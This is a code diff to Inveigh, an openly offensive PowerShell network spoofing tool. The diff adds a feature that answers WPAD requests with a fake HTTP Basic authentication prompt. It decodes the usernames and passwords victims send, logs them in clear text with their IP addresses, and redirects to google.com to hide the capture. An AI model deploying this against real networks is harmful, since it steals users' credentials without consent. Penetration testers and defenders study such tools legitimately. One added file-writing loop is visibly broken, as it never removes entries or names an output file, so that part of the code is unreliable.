@@ -166,6 +166,7 @@ param
     [parameter(Mandatory=$false)][string]$SMBRelayCommand = "",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Repeat="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ForceWPADAuth="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ClearText="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$FileOutput="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
@@ -221,6 +222,7 @@ if(!$inveigh)
     $inveigh.log = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
+    $inveigh.ClearText_list = New-Object System.Collections.ArrayList
     $inveigh.IP_capture_list = @()
     $inveigh.SMBRelay_failed_list = @()
 }
@@ -239,6 +241,7 @@ $inveigh.status_queue = New-Object System.Collections.ArrayList
 $inveigh.log_file_queue = New-Object System.Collections.ArrayList
 $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
 $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
+$inveigh.ClearText_file_queue = New-Object System.Collections.ArrayList
 $inveigh.certificate_thumbprint = "76a49fd27011cf4311fb6914c904c90a89f3e4b2"
 $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
 $inveigh.console_output = $false
@@ -247,6 +250,7 @@ $inveigh.file_output = $false
 $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
 $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
 $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
+$inveigh.ClearText_out_file = $output_directory + "\Inveigh-ClearText.txt"
 $Inveigh.challenge = $Challenge
 $inveigh.running = $true
 
@@ -406,6 +410,11 @@ else
 if($MachineAccounts -eq 'n')
 {
     $inveigh.status_queue.add("Ignoring Machine Accounts")|Out-Null
+}
+
+if($ClearText -eq 'y')
+{
+    $inveigh.status_queue.add("Force HTTP Basic Auth Enabled")|Out-Null
 }
 
 if($ForceWPADAuth -eq 'y')
@@ -637,7 +646,7 @@ $SMB_NTLM_functions_scriptblock =
 # HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
 $HTTP_scriptblock = 
 { 
-    param ($MachineAccounts,$ForceWPADAuth)
+    param ($MachineAccounts,$ForceWPADAuth,$ClearText)
 
     Function NTLMChallengeBase64
     {
@@ -685,7 +694,7 @@ $HTTP_scriptblock =
         $inveigh.context = $inveigh.HTTP_listener.GetContext() 
         $inveigh.request = $inveigh.context.Request
         $inveigh.response = $inveigh.context.Response
-        $inveigh.message = ''
+        $inveigh.message = '<html><head><meta http-equiv="refresh" content="0; url=http://www.google.com/"></head></html>'
         $NTLM = 'NTLM'
         
         if($inveigh.request.IsSecureConnection)
@@ -701,6 +710,11 @@ $HTTP_scriptblock =
         if (($inveigh.request.RawUrl -match '/wpad.dat') -and ($ForceWPADAuth -eq 'n'))
         {
             $inveigh.response.StatusCode = 200
+        }
+        elseif (($inveigh.request.RawUrl -match '/wpad.dat') -and ($ClearText -eq 'Y') -and ($ForceWPADAuth -eq 'Y'))
+        {
+            $inveigh.response.StatusCode = 401
+            $inveigh.response.AddHeader("WWW-Authenticate", 'Basic realm="IExplore"')
         }
         else
         {
@@ -810,12 +824,48 @@ $HTTP_scriptblock =
         
         }
         
-        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
-        $inveigh.response.ContentLength64 = $HTTP_buffer.length
-        $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
-        $HTTP_stream = $inveigh.response.OutputStream
-        $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
-        $HTTP_stream.close()
+        if($authentication_header.StartsWith('Basic '))
+        {
+             $authentication_header = $authentication_header -replace 'Basic ',''
+             $credstring = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($authentication_header))
+             $Username = $credstring.split(':')[0]
+             $password = $credstring.split(':')[-1]
+             $inveigh.ClearText = "$Username $password"
+
+             $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - HTTP Basic Auth captured: $($inveigh.ClearText) From -> $($inveigh.request.RemoteEndpoint.Address)")])
+             $inveigh.ClearText_file_queue.add($inveigh.ClearText)
+             $inveigh.ClearText_list.add($inveigh.ClearText)
+             $inveigh.console_queue.add("$(Get-Date -format 's') - HTTP Basic Auth captured: $($inveigh.ClearText) From -> $($inveigh.request.RemoteEndpoint.Address)")
+
+             
+             if($inveigh.file_output)
+             {
+                $inveigh.console_queue.add("ClearText Credentials written to " + $inveigh.ClearText_out_file)
+             }
+
+             $inveigh.response.StatusCode = 200
+        }
+
+        if($ClearText -eq 'y')
+        {
+            [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
+            $inveigh.response.ContentLength64 = $HTTP_buffer.length
+            #$inveigh.response.AddHeader("WWW-Authenticate","Basic realm='IExplore'")
+            $HTTP_stream = $inveigh.response.OutputStream
+            $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
+            $HTTP_stream.close()
+        }
+        else
+        {
+           [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
+           $inveigh.response.ContentLength64 = $HTTP_buffer.length
+           $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
+           $HTTP_stream = $inveigh.response.OutputStream
+           $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
+           $HTTP_stream.close() 
+        }
+       
+   
     }
 
     $inveigh.HTTP_listener.Stop()
@@ -1178,6 +1228,11 @@ $sniffer_scriptblock =
                 $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                 $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
             }
+
+            while($inveigh.ClearText_file_queue.Count -gt 0)
+            {
+                $inveigh.ClearText_file_queue[0]|Out-File $inveigh
+            }
         }
     }
 
@@ -1217,7 +1272,7 @@ Function HTTPListener()
     $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
     $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
-    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($MachineAccounts).AddArgument($ForceWPADAuth) > $null
+    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($MachineAccounts).AddArgument($ForceWPADAuth).AddArgument($ClearText) > $null
     $HTTP_handle = $HTTP_powershell.BeginInvoke()
 }
 
@@ -1477,6 +1532,15 @@ Function Get-Inveigh
             }
         }    
     }
+}
+
+Function Get-InveighClearText
+{
+    <#
+    .SYNOPSIS 
+    Get-InveighClearText will get all captured cleartext credentials
+    #>
+    $inveigh.ClearText_list
 }
 
 Function Get-InveighNTLM
